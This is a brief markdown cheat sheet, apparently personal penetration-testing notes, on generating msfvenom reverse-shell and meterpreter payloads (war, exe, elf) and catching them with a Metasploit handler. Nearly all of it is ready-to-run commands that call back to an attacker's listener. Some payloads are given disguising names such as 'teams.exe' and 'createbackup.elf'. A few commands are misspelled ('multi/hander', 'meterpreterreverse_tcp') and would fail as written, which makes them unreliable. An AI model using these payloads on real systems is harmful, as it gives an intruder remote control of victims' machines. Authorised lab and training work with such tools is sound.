# msfvenom

## Overview

msfvenom is a payload generator.
You can create reverse shells in many different formars


## Usage

### Getting a war payload

Create the payload

	msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.46 LPORT=9001 -f war -o payload.war

Now start metasploit

	msfconsole

Use the handler that is gonna handle the reverse connection from the payload

	use exploit/multi/hander

Set the payload that we created with msfvenom

	set payload windows/x64/meterpreterreverse_tcp

Set the interfacte that the handler is gonna listen on waiting for the reverse connection

	set LHOST tun0

Set the port specified in the payload in msfvenom

	set LPORT 9001

Run the handler

	exploit -j

Now execute the war payload (by accessing the jsp inside) and we should have a connection.
When we have a session do

	sessions -i 1

To interact with it

### List Payloads

```shell
msfvenom -l payloads
```


### Getting a cmd .exe payload

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<mylocalhostip> LPORT=<myserverport> -f exe -o <name_of_the_exe>
```

Example:

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.8.120 LPORT=443 -f exe -o teams.exe
```

### Getting a powershell .exe payload

```shell
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=<mylocalhostip> LPORT=<myserverport> -f exe -o <name_of_the_exe>
```

### Create a elf payload

```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```